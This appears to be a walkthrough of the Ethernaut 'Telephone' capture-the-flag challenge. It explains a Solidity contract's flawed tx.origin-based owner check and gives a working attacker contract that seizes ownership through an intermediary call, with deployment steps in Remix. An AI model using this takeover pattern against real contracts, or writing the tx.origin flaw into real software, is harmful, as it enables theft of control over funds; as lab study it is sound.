This contract has the objective of becoming the owner of the contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

Above is the code of the contract. As we can see the way to change the owner of the contract is to call ```changeOwner``` with the ```tx.origin``` and the ```msg.sender``` variable being different from eachother. I found this [link](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin/1892) that described the difference between the 2 variables. Looking over this link it looks like we can have the 2 be different if we have a contract send the command for us. In this case the ```tx.origin``` will be our address but ```msg.sender``` will be the contract's address. 

The code to attack the contract is below. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
    Telephone public vuln;
    
    constructor() public {
        vuln = Telephone(0x61332fcF368A1639df28896EA6bA79Ba6b79E2bb);
    }
    
    function exploit() public {
        vuln.changeOwner(0x7cd9b6A2c517e1930F230d032Ab25F497A87c651);
    }
}
```

In this code we have to set the address to Telephone contract by using the instance command on Ethernaut. I created a function called exploit that calls changeOwner of the vulnerable contract with our player address as the parameter. All we have to do is deploy the contract with remix and call the exploit function using their site. 

![](attach/Pasted%20image%2020210822210033.png)

![](attach/Pasted%20image%2020210822210100.png)